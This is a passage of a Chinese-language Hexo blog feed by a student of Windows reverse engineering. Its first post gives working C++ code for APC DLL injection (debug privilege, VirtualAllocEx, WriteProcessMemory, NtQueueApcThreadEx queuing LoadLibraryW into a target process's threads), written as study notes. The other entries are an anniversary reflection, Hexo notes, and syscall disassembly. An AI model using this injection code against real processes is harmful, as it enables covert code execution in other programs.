class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(*NtQueueApcThreadEx)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE thread,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 flag,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 NormalRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 NormalContext,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 s1,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 s2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="built_in">NTSTATUS</span>(*pNtQueueApcThreadEx)</span><br><span class="line">(</span><br><span class="line">HANDLE thread,</span><br><span class="line">ULONG64 flag,</span><br><span class="line">ULONG64 NormalRoutine,</span><br><span class="line">ULONG64 NormalContext,</span><br><span class="line">ULONG64 s1,</span><br><span class="line">ULONG64 s2</span><br><span class="line">) = <span class="literal">NULL</span>;</span><br><span class="line">LPTHREAD_START_ROUTINE pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hToken;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">LUID luid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开当前进程的访问令牌</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法打开进程令牌。错误: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找调试特权的LUID</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luid)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法查找调试特权的LUID。错误: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置特权</span></span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调整特权</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法调整令牌特权。错误: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查调整特权的结果</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;令牌不具有指定的特权。错误: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取目标pid-&gt;申请空间-&gt;写入DLL路径-&gt;获取LoadLibrary地址-&gt;用APC挂钩函数挂上LoadLibrary函数，传参DLL路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">PVOID <span class="title">getFunction</span><span class="params">(LPCSTR ModuleName, LPCSTR funcName, HMODULE&amp; hMoule)</span> </span>&#123;</span><br><span class="line">hMoule = <span class="built_in">GetModuleHandleA</span>(ModuleName);</span><br><span class="line"><span class="keyword">if</span> (!hMoule) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;模块打开失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">PVOID pfunc = <span class="built_in">GetProcAddress</span>(hMoule, funcName);</span><br><span class="line"><span class="keyword">if</span> (!pfunc) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;函数查找失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pfunc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">//防止访问权限不够，使用令牌提高权限</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">EnableDebugPrivilege</span>()) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;调整权限失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Ntdll和NtQueueApcThreadEx</span></span><br><span class="line">HMODULE hNtdll;</span><br><span class="line">pNtQueueApcThreadEx = (NtQueueApcThreadEx)<span class="built_in">getFunction</span>(<span class="string">&quot;Ntdll&quot;</span>, <span class="string">&quot;NtQueueApcThreadEx&quot;</span>, hNtdll);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取kernal32和LoadLibrary</span></span><br><span class="line">HMODULE hKernel32;</span><br><span class="line">pLoadLibrary = (LPTHREAD_START_ROUTINE)<span class="built_in">getFunction</span>(<span class="string">&quot;kernel32&quot;</span>, <span class="string">&quot;LoadLibraryW&quot;</span>, hKernel32);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取PID</span></span><br><span class="line">DWORD dwPid = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;请输入进程PID：&quot;</span>;</span><br><span class="line">std::cin &gt;&gt; dwPid;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//申请空间</span></span><br><span class="line">WCHAR dllpath[] = <span class="string">L&quot;C:\\Users\\a2879\\source\\repos\\valentForAPCinject\\x64\\Debug\\messageboxDLL.dll&quot;</span>;</span><br><span class="line">LPVOID lpDLLpath = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(dllpath) + <span class="number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!lpDLLpath) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;内存分配失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写入dll路径</span></span><br><span class="line">SIZE_T bytesWritten;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, lpDLLpath, dllpath, <span class="built_in">sizeof</span>(dllpath) + <span class="number">1</span>, &amp;bytesWritten)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;写入失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取线程</span></span><br><span class="line">DWORD dwThreadID;</span><br><span class="line">THREADENTRY32 te32 = &#123;&#125;;</span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std::vector&lt;DWORD&gt; Vthread = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hSnapshot, &amp;te32)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">Vthread.<span class="built_in">push_back</span>(te32.th32ThreadID);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = Vthread.<span class="built_in">rbegin</span>(); it != Vthread.<span class="built_in">rend</span>(); it++) &#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread) &#123;</span><br><span class="line"><span class="built_in">pNtQueueApcThreadEx</span>(hThread, <span class="number">1</span>, (ULONG64)pLoadLibrary, (ULONG64)lpDLLpath, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//特殊用户APC</span></span><br><span class="line"><span class="comment">//QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)lpDLLpath);//普通用户APC</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;成功执行:&quot;</span> &lt;&lt; *it &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="comment">//break;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;无法打开线程\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;执行结束&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上代码通过在管理员权限下运行，然后创建一个带窗口的程序进行测试。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg) &#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE: &#123;</span><br><span class="line"><span class="built_in">CreateWindow</span>(</span><br><span class="line"><span class="string">L&quot;BUTTON&quot;</span>, <span class="string">L&quot;test&quot;</span>,</span><br><span class="line">WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">30</span>,</span><br><span class="line">hwnd, (HMENU)<span class="number">1</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND: &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOWORD</span>(wParam) == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">SleepEx</span>(<span class="number">1000</span>, TRUE);<span class="comment">//调用会进行APC执行的函数，true表明会被APC执行打断，从而产生效果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY: &#123;</span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span> </span>&#123;</span><br><span class="line">WNDCLASS wc = &#123;&#125;;</span><br><span class="line">wc.lpfnWndProc = WindowProc;</span><br><span class="line">wc.hInstance = hInstance;</span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;testForAPC&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line">HWND hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line"><span class="number">0</span>, <span class="string">L&quot;testForAPC&quot;</span>, <span class="string">L&quot;testForAPC&quot;</span>,</span><br><span class="line">WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, <span class="number">640</span>, <span class="number">480</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, nCmdShow);</span><br><span class="line"></span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像是概率成功，和APC执行靠概率有联系。同时好像必须用窗口程序，如果是命令行就一定不会触发。经过实测，注入后会直接成功而不需要触发SleepEx或者WaitingForSingleObject之类的函数,怀疑是窗口本身因素的影响</p><hr><h2 id="没解决的问题">没解决的问题</h2><p>其它程序注入后没有效果，<br>不知道为什么要逆序注入才不会崩溃</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> DLL注入 </category>
          
          <category> shellcode注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当我又想起-本站一周年纪念</title>
      <link href="/posts/bdf313e6.html"/>
      <url>/posts/bdf313e6.html</url>
      
        <content type="html"><![CDATA[<div class='poem'><div class='poem-title'></div><div class='poem-author'></div><p>我爱那个人，</p><p>他看见骰子有利于他而怀惭，</p><p>而他自问：我是一个作弊的赌博者吗？</p><p>——因为他愿意死灭。</p></div><p>一段路，终究是自己的，终究是自己走的，终究是走向毁灭的。</p><p>一年的苦旅，一瞬的悲鸣，又似曾想起过往的起伏，过往的酸辛。梦幻——是我对生活的评价。然而所谓的”生活“，只是在我遥不可及的上空默默旁观我的负隅顽抗——对极简的和繁琐的，对天真的和成熟的，对铭记的和忘却的，对情感的和世界的，对生活和现实的。就像一绽的昙花，与已逝的泡沫，随风远去的我的灵魂，也在展露光华之后沉没在海中。那片海，只会偏爱我高歌猛进，只会怜悯我向隅而泣，对其余一概不管不问，漠不关心。因而我所心慕手追的那片星海，同其余人一道的那片，只不过是名为“星海”的幻觉，名为“星海”的星海。它不关心我，只关心我的爱与恨。它不关心我，只关心我的幻觉是否深刻。它不关心我，只关心我所拥有的一切。我是羡慕的，羡慕和我一起沉默在海中的尘埃们，它们从阴翳之中来，到海中去，去洗去阴翳，迎接梦幻。当我看到它的时候，我就知道，我已然离不开它，因为这里是单向度的，这里只有下沉，而没有给旅者一条归途。所以呢，我想要回去吗？做梦吧——梦里的海，才是一片花海，一片粉红。然而越是梦，越是看见了梦的可怖，因为梦身在海中。一种不寒而栗，一种细思极恐于镜面晃碎了海中飘渺的倩影形成阴霾，我拨开那片阴翳，只能看见头顶的星，一如既往地对我发出嘲笑，漠视我向更深的海沟中沉没，成为星本身。</p><p>梦——何时才能醒呢</p><hr><p>还是要总结一下这一年的学习，只能说，还是只有上学期学得好些，比较自由，这个学期总是有一堆杂事，什么办比赛啊，招新啊，不过这个学期一完，下学期应该就好了，再也不想出题了QAQ，这个学期，在Windows方向继续深入学习：</p><ul><li>栈，函数调用约定</li><li>系统调用</li><li>APC注入</li><li>WIN并发与同步</li><li>DLL卸载</li><li>PE加载器实现</li><li>多线程基本知识</li></ul><p>做题方面：</p><ul><li>sekaictf 复现了1个题</li><li>长城杯 复现了2个题</li><li>SCTF 复现了1个题</li><li>网鼎杯青龙 复现完毕</li><li>强网杯 复现了3个题</li><li>强网拟态 复现了3个题，有一个不会</li><li>鹏城杯 做了4个，还没复现</li><li>楚慧杯 ak</li></ul><p>做题确实做少了，一直在忙招新和出题的事情，裂开了，之后要开始复现了</p><p>CTF相关的其它方面：<br>这个学期学了很多和python有关的知识点</p><ul><li>SCTF的CYTHON复现</li><li>Cython学习</li><li>python运行时获取信息</li></ul><p>工具使用：</p><ul><li>angr学习</li><li>idaPython常见接口</li><li>Frida基本使用方法</li></ul><p>开发方面：</p><ul><li>CPP网络编程</li><li>JAVA相关</li></ul><p>越往后写，越发现我菜，大概就只学了这么多了，太悲伤了<br>不过一想到还是出了6个视频给萌新看，又感觉还不错<br>新的一年，加油学习吧！</p><p>后续规划：<br>WINDOWS还是要继续学的，学长建议学点其它方向的内容，我决定还是学点PWN<br>Z师傅说他要学WEB，我准备和他每周交换一下学习进度，就当作我也在学了<br>PWN的话主要就是跟着师傅们的路线学就好，有问题就问</p><p>CPP是要继续学的，我想把这个当作我的第一语言，我已经有了一个服务器了，尝试写一个可以交互的程序，如果可以学一点图形化。CPP还是得在实践中练习<br>JAVA项目是要继续的，好歹是第一个拿到的项目，我也想看到它上架创意工坊的一天。</p><p>WIN逆向相关我也得继续学，具体路线是跟着逆向工程核心原理来学，我才看完DLL注入，后面还有代码注入，API勾取，64位WIN内核，高级逆向分析技术（TEB和PEB，SEH和VEH，反调，自我创建等）<br>然后就是跟着Windows内核课继续学，这个太难了，等着抽空学吧</p><p>今天看了看招聘信息，感觉我的实践能力还是太弱了，不过也确实没什么时间实践了，我准备把这个放到下个学期开始之后，距离放假还有3周还有3，4科要复习，start study！追求自己的热爱，何尝不是一种生活！</p><hr><p>本站建成于2023年12月12日，已写86篇博客，总字数达到15万字（虽然一堆是代码），十分开心。建站初衷是记录自己的成长和帮助大家！</p><p>今天你热爱生活了吗？</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 记录 </category>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一周年纪念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo学习</title>
      <link href="/posts/915c044a.html"/>
      <url>/posts/915c044a.html</url>
      
        <content type="html"><![CDATA[<h2 id="多级分类">多级分类</h2><p>Hexo的多级分类是：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">categories</span><span class="punctuation">:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">a</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">b</span></span><br></pre></td></tr></table></figure><p>表示分类为a下的b</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">categories</span><span class="punctuation">:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">前端</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">CSS</span></span><br></pre></td></tr></table></figure><p>表示文章位于前端的CSS中</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">categories</span><span class="punctuation">:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[http]</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[html]</span></span><br></pre></td></tr></table></figure><p>表示文章既在http分类中，又在html分类中</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">categories</span><span class="punctuation">:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[学习,http]</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[学习,html]</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[务必注意]</span></span><br></pre></td></tr></table></figure><p>表示文章既在学习的子分类http中，又在子分类html中，同时也在务必注意中</p><p>而tag则都是平等的，没有层级</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-系统调用</title>
      <link href="/posts/7df42b75.html"/>
      <url>/posts/7df42b75.html</url>
      
        <content type="html"><![CDATA[<h2 id="系统调用">系统调用</h2><p>R3函数执行底层操作时，需要调用可以syscall的位于Ntdll或User32的dll里的系统函数。</p><p>调试时跟踪系统函数，以creatreThread为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00007FFA5FEB1990  mov         r10,rcx  </span><br><span class="line">00007FFA5FEB1993  mov         eax,0C7h  </span><br><span class="line">00007FFA5FEB1998  test        byte ptr [7FFE0308h],1  </span><br><span class="line">00007FFA5FEB19A0  jne         00007FFA5FEB19A5  </span><br><span class="line">00007FFA5FEB19A2  syscall</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ntdll.dll:00007FFA5FEB1990 loc_7FFA5FEB1990:                       ; CODE XREF: kernelbase_CreateRemoteThreadEx+298↑p</span><br><span class="line">ntdll.dll:00007FFA5FEB1990                                         ; DATA XREF: KERNELBASE.dll:off_7FFA5D9EF8A0↑o</span><br><span class="line">ntdll.dll:00007FFA5FEB1990                 mov     r10, rcx</span><br><span class="line">ntdll.dll:00007FFA5FEB1993                 mov     eax, 0C7h</span><br><span class="line">ntdll.dll:00007FFA5FEB1998                 test    byte_7FFE0308, 1</span><br><span class="line">ntdll.dll:00007FFA5FEB19A0                 jnz     short loc_7FFA5FEB19A5</span><br><span class="line">ntdll.dll:00007FFA5FEB19A2                 syscall                 ; Low latency system call</span><br><span class="line">ntdll.dll:00007FFA5FEB19A4                 retn</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5 ; ---------------------------------------------------------------------------</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5 loc_7FFA5FEB19A5:                       ; CODE XREF: ntdll.dll:00007FFA5FEB19A0↑j</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5                 int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5                                         ; DS:SI -&gt; counted CR-terminated command string</span><br><span class="line">ntdll.dll:00007FFA5FEB19A7                 retn</span><br></pre></td></tr></table></figure><p>我的系统版本是23H2，说明在23H2中NtCreateThreadEx系统调用号为C7</p><p>代码执行完之后，新线程就被创建了。但是控制权还没在新线程里，先把当前线程sleep或者getchar阻塞强制转换一下就可以看到输出</p><p>基本调用格式：(x64(x86还没看QAQ))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov r10,x</span><br><span class="line">mov r9,x</span><br><span class="line">mov r8,x</span><br><span class="line">mov rdx,x   ;上面都是参数</span><br><span class="line">mov rax, callNum   ;系统调用号</span><br><span class="line">syscall   ;进入系统调用，汇编为 0F 05</span><br></pre></td></tr></table></figure><p>上面也能看到int 2E是x32和dos的syscall进入方式</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> Win核心 </category>
          
          <category> Win内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈/函数调用约定</title>
      <link href="/posts/b1cf25a9.html"/>
      <url>/posts/b1cf25a9.html</url>
      
        <content type="html"><![CDATA[<h2 id="栈的调用约定">栈的调用约定</h2><blockquote><p>(1)函数参数的压栈顺序，(2)由调用者还是被调用者把参数弹出栈，(3)以及产生函数修饰名的方法。</p></blockquote><h3 id="普通函数">普通函数</h3><p><a href="https://zhuanlan.zhihu.com/p/170134539#:~:text=__cdecl%E3%80%81__">函数调用的三种约定，你都清楚吗 - 知乎 (zhihu.com)</a></p><h4 id="cdecl">__cdecl</h4><p>C/CPP默认方式，参数从右向左入栈，主调函数负责栈平衡</p><h4 id="stdcall">__stdcall</h4><p>WIN API默认方式，参数从右向左入栈，被调函数负责栈平衡</p><h4 id="fastacll">__fastacll</h4><p><code>x64仅有这一种传参</code></p><p>参数优先传给寄存器然后剩下的参数从右向左入栈传送</p><p>写测试代码观察反汇编结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span 